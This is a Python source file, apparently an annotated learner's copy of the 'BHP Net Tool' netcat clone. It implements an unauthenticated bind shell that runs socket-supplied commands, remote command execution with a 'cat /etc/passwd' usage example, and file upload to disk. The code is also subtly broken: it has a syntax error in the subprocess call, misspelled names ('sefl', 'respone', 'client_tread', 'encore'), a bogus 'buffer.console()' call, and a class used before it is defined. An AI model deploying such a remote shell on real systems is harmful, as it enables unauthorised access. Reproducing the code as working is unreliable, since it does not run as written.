import argparse # for parsing command-line arguments
import socket # for network connection
import shlex # for parsing strings into commands
import subprocess # for running external commands
import sys # for accessing system-specific parameters
import textwrap # for text formatting
import threading # for implementing concurrency

# function to execute a command and return its output
def execute(cmd):
    # strip the command to remove leading/trailing whitespaces
    cmd = cmd.strip()

    # if the command is empty, return None
    if not cmd:
        return

    # execute the command and get the output, using shlex to handle shell-like syntax
    output = subprocess.check_output(shlex.split(cmd)), stderr = subprocess.STDOUT)

    # decode the output from bytes to string and return
    return output.decode()

# main function where the program starts
if __name__ == '__main__':
    # argument parser for parsing command line arguments
    parser = argparse.ArgumentParser(
        description='BHP Net Tool', #description of the script
        formatter_class=argparse.RawDescriptionHelpFormatter, # format the description
        epilog=textwrap.dedent('''
            netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to a file
            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
            netcat.py -t 192.168.1.108 -p 5555 # connect to server 
        '''))

    # define the command-line arguments that the script can accept
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')

    # parse the arguments from the command line
    args = parser.parse_args()

    # if in listen mode, we don't end read from stdin
    if args.listen:
        buffer = ''
    else:
        # read the buffer from stdin (e.g., for sending data to a server)
        buffer = sys.stdin.read()

    # initialize the NetCat object
    nc = NetCat(args, buffer.console())

    # start the NetCat operation
    nc.run()

class NetCat:
    # constructor for the NetCat class 
    def __init__(self, args, buffer=None):
        # store the command-line arguments and the initial buffer
        self.args = args
        self.buffer = buffer

        # create a socket object for the network communication
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # set a socket option; here, it allows the reuse of the same address
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # main run method to determine whether to listen or to send data
    def run(self):
        if self.args.listen:
            # if the listen flag is set, start listening for incoming connections
            self.listen()
        else:
            # otherwise, initiate a connection to send data
            self.send()

    # method to handle sending data to a server or remote host
    def send(self):
        # connect to the specified target IP and port
        self.socket.connect((self.args.target, self.args.port))

        # if there is data in the buffer, send it immediatly after connecting
        if self.buffer:
            self.socket.send(self.buffer)

        try:
            # loop to continuously receive data from the target and respond
            while True:
                recv_len = 1 
                response = ''

                # receive data in a loop until no more data is sent
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()

                    # if less than 4096 bytes are received, it's likely the end of data
                    if recv_len < 4096:
                        break

                # print the response data received from the target
                if respone:
                    print(response)

                    # wait for additionnal input from the user
                    buffer = input('> ')
                    buffer += '\n'

                    # send the user input to the target
                    self.socket.send(buffer.encode())
        
        # handle the scenario where the user interrupts the program
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()


    def listen(sefl):
        """
        Set up the server to listen for incoming connections on the target IP and port.
        This method binds the server to the specified address and starts listening for
        incoming connections. For each connection, it starts a new thread to handle
        the client communication.
        """
        # Bind the socket to the server address
        self.socket.bind((self.args.target, self.args.port))

        # Start listening with a maximum backlog of 5 connections
        self.socket.listen(5)

        # Enter the loop to accept incoming connections
        while True:

            # Accept an incoming connection
            client_socket, _ = self.socket.accept()

            # Start a new thread to handle the client connection
            client_tread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )

            # begin the client handling thread
            client_thread.start()

    def handle(self, client_socket):
        """
        Handle client connections for different modes like execute, upload, or command.
        For 'execute', it runs a command and sends the output back to the client.
        For 'upload', it saves the incoming data to a file.
        For 'command', it provides a simple command shell.
        """

        # If the execute command is set run the command and send back the output
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        # If the upload argument is set, receive all the data and save it to the specified file
        elif self.args.upload:

            # initialize a buffer to store the incoming file data
            file_buffer = b''

            # Keep receiving the data until there is no more to come
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break

            # Write the received data to a file
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)

            # Send a comfirmation message back to the client 
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encore())

        # If the command argument is set, provide a simple shell
        elif self.args.command:

            # initialize a buffer to accumulate the command from the client
            cmd_buffer = b''

            # Enter a loop to interact with the client indefinitly
            while True:
                try:

                    # prompt the client for a command
                    client_socket.send(b'BHP: #> ')

                    # Receiving characters until a newline character is detected
                    # indicating the end the client's command input
                    while '\n' not in cmd_buffer.decode():

                        # receive data from the client 64 bytes at a time
                        cmd_buffer += client_socket.recv(64)

                    # Once the full command as been received, execute it
                    response = execute(cmd_buffer.decode())

                    # If there is a response from the command, send it back to the client
                    if response:
                        client_socket.send(response.encode())

                    # Resets the command buffer to receive the next command
                    cmd_buffer = b''

                # Handle any exception that occuer during command execution
                except Exception as e:

                    # Print the error message indicating the server has been killed
                    print(f'server killed {e}')

                    # Close the socket connection to the client
                    self.socket.close()

                    # Exit the program
                    sys.exit()

